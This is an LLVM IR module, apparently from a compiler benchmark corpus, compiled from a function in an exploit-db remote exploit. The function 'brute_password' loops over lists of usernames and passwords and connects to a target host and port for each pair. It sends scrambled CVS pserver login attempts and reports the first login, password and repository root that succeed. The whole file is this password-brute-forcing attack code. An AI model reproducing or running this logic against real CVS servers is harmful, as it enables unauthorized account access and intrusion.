; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_password.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_password.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i64 }
%struct.TYPE_5__ = type { i64 }
%struct.TYPE_6__ = type { i64 }

@.str = private unnamed_addr constant [30 x i8] c"Bruteforcing cvs password...\0A\00", align 1
@USERNAMES = common dso_local global %struct.TYPE_4__* null, align 8
@user = common dso_local global i64 0, align 8
@PASSWORDS = common dso_local global %struct.TYPE_5__* null, align 8
@.str.1 = private unnamed_addr constant [30 x i8] c"Trying login = %s, pass = %s\09\00", align 1
@host = common dso_local global i32 0, align 4
@port = common dso_local global i32 0, align 4
@CVS_VERIF = common dso_local global i32 0, align 4
@root = common dso_local global i64 0, align 8
@CVSROOTS = common dso_local global %struct.TYPE_6__* null, align 8
@CVS_AUTH_FAILED = common dso_local global i32 0, align 4
@BAD_TRIP = common dso_local global i8* null, align 8
@CVS_AUTH_SUCCESS = common dso_local global i32 0, align 4
@GOOD_TRIP = common dso_local global i8* null, align 8
@pass = common dso_local global i64 0, align 8
@SUCCESS_LOGON = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @brute_password() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  %6 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %7

7:                                                ; preds = %171, %0
  %8 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %9 = load i32, i32* %3, align 4
  %10 = sext i32 %9 to i64
  %11 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i64 %10
  %12 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %11, i32 0, i32 1
  %13 = load i64, i64* %12, align 8
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %174

15:                                               ; preds = %7
  %16 = load i64, i64* @user, align 8
  %17 = icmp ne i64 %16, 0
  br i1 %17, label %27, label %18

18:                                               ; preds = %15
  %19 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %20 = load i32, i32* %3, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %19, i64 %21
  %23 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 8
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %27

26:                                               ; preds = %18
  br label %171

27:                                               ; preds = %18, %15
  store i32 0, i32* %2, align 4
  br label %28

28:                                               ; preds = %163, %27
  %29 = load %struct.TYPE_5__*, %struct.TYPE_5__** @PASSWORDS, align 8
  %30 = load i32, i32* %2, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %32, i32 0, i32 0
  %34 = load i64, i64* %33, align 8
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %36, label %166

36:                                               ; preds = %28
  %37 = load i64, i64* @user, align 8
  %38 = icmp ne i64 %37, 0
  br i1 %38, label %39, label %41

39:                                               ; preds = %36
  %40 = load i64, i64* @user, align 8
  br label %48

41:                                               ; preds = %36
  %42 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %43 = load i32, i32* %3, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %42, i64 %44
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  br label %48

48:                                               ; preds = %41, %39
  %49 = phi i64 [ %40, %39 ], [ %47, %41 ]
  %50 = load %struct.TYPE_5__*, %struct.TYPE_5__** @PASSWORDS, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %50, i64 %52
  %54 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %53, i32 0, i32 0
  %55 = load i64, i64* %54, align 8
  %56 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i64 %49, i64 %55)
  %57 = load i32, i32* @host, align 4
  %58 = load i32, i32* @port, align 4
  %59 = call i32 @nopen(i32 %57, i32 %58)
  %60 = load i32, i32* @CVS_VERIF, align 4
  %61 = load i64, i64* @root, align 8
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %48
  %64 = load i64, i64* @root, align 8
  br label %77

65:                                               ; preds = %48
  %66 = load %struct.TYPE_6__*, %struct.TYPE_6__** @CVSROOTS, align 8
  %67 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %67, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 8
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %66, i64 %73
  %75 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %74, i32 0, i32 0
  %76 = load i64, i64* %75, align 8
  br label %77

77:                                               ; preds = %65, %63
  %78 = phi i64 [ %64, %63 ], [ %76, %65 ]
  %79 = load i64, i64* @user, align 8
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %83

81:                                               ; preds = %77
  %82 = load i64, i64* @user, align 8
  br label %90

83:                                               ; preds = %77
  %84 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %85 = load i32, i32* %3, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %84, i64 %86
  %88 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %87, i32 0, i32 1
  %89 = load i64, i64* %88, align 8
  br label %90

90:                                               ; preds = %83, %81
  %91 = phi i64 [ %82, %81 ], [ %89, %83 ]
  %92 = load %struct.TYPE_5__*, %struct.TYPE_5__** @PASSWORDS, align 8
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %92, i64 %94
  %96 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %95, i32 0, i32 0
  %97 = load i64, i64* %96, align 8
  %98 = call i32 @scramble(i64 %97)
  %99 = call i32 @nprintf(i32 %60, i64 %78, i64 %91, i32 %98)
  %100 = call i8* (...) @flush_sock()
  store i8* %100, i8** %5, align 8
  %101 = call i32 (...) @nclose()
  %102 = load i8*, i8** %5, align 8
  %103 = load i32, i32* @CVS_AUTH_FAILED, align 4
  %104 = call i64 @strstr(i8* %102, i32 %103)
  %105 = icmp ne i64 %104, 0
  br i1 %105, label %106, label %110

106:                                              ; preds = %90
  %107 = load i8*, i8** @BAD_TRIP, align 8
  %108 = load i8*, i8** %5, align 8
  %109 = call i32 (i8*, ...) @info(i8* %107, i8* %108)
  br label %160

110:                                              ; preds = %90
  %111 = load i8*, i8** %5, align 8
  %112 = load i32, i32* @CVS_AUTH_SUCCESS, align 4
  %113 = call i64 @strstr(i8* %111, i32 %112)
  %114 = icmp ne i64 %113, 0
  br i1 %114, label %115, label %156

115:                                              ; preds = %110
  %116 = load i8*, i8** @GOOD_TRIP, align 8
  %117 = call i32 (i8*, ...) @info(i8* %116)
  %118 = load i64, i64* @root, align 8
  %119 = icmp ne i64 %118, 0
  br i1 %119, label %132, label %120

120:                                              ; preds = %115
  %121 = load %struct.TYPE_6__*, %struct.TYPE_6__** @CVSROOTS, align 8
  %122 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %123 = load i32, i32* %3, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %122, i64 %124
  %126 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 8
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %121, i64 %128
  %130 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %129, i32 0, i32 0
  %131 = load i64, i64* %130, align 8
  store i64 %131, i64* @root, align 8
  br label %132

132:                                              ; preds = %120, %115
  %133 = load i64, i64* @user, align 8
  %134 = icmp ne i64 %133, 0
  br i1 %134, label %142, label %135

135:                                              ; preds = %132
  %136 = load %struct.TYPE_4__*, %struct.TYPE_4__** @USERNAMES, align 8
  %137 = load i32, i32* %3, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %136, i64 %138
  %140 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %139, i32 0, i32 1
  %141 = load i64, i64* %140, align 8
  store i64 %141, i64* @user, align 8
  br label %142

142:                                              ; preds = %135, %132
  %143 = load %struct.TYPE_5__*, %struct.TYPE_5__** @PASSWORDS, align 8
  %144 = load i32, i32* %2, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %143, i64 %145
  %147 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %146, i32 0, i32 0
  %148 = load i64, i64* %147, align 8
  store i64 %148, i64* @pass, align 8
  %149 = load i8*, i8** %5, align 8
  %150 = call i32 @free(i8* %149)
  %151 = load i8*, i8** @SUCCESS_LOGON, align 8
  %152 = load i64, i64* @user, align 8
  %153 = load i64, i64* @pass, align 8
  %154 = load i64, i64* @root, align 8
  %155 = call i32 @printf(i8* %151, i64 %152, i64 %153, i64 %154)
  store i32 1, i32* %1, align 4
  br label %175

156:                                              ; preds = %110
  %157 = load i8*, i8** @BAD_TRIP, align 8
  %158 = call i32 (i8*, ...) @info(i8* %157)
  br label %159

159:                                              ; preds = %156
  br label %160

160:                                              ; preds = %159, %106
  %161 = load i8*, i8** %5, align 8
  %162 = call i32 @free(i8* %161)
  br label %163

163:                                              ; preds = %160
  %164 = load i32, i32* %2, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %2, align 4
  br label %28

166:                                              ; preds = %28
  %167 = load i64, i64* @user, align 8
  %168 = icmp ne i64 %167, 0
  br i1 %168, label %169, label %170

169:                                              ; preds = %166
  store i32 0, i32* %1, align 4
  br label %175

170:                                              ; preds = %166
  br label %171

171:                                              ; preds = %170, %26
  %172 = load i32, i32* %3, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %3, align 4
  br label %7

174:                                              ; preds = %7
  store i32 0, i32* %1, align 4
  br label %175

175:                                              ; preds = %174, %169, %142
  %176 = load i32, i32* %1, align 4
  ret i32 %176
}

declare dso_local i32 @info(i8*, ...) #1

declare dso_local i32 @nopen(i32, i32) #1

declare dso_local i32 @nprintf(i32, i64, i64, i32) #1

declare dso_local i32 @scramble(i64) #1

declare dso_local i8* @flush_sock(...) #1

declare dso_local i32 @nclose(...) #1

declare dso_local i64 @strstr(i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @printf(i8*, i64, i64, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
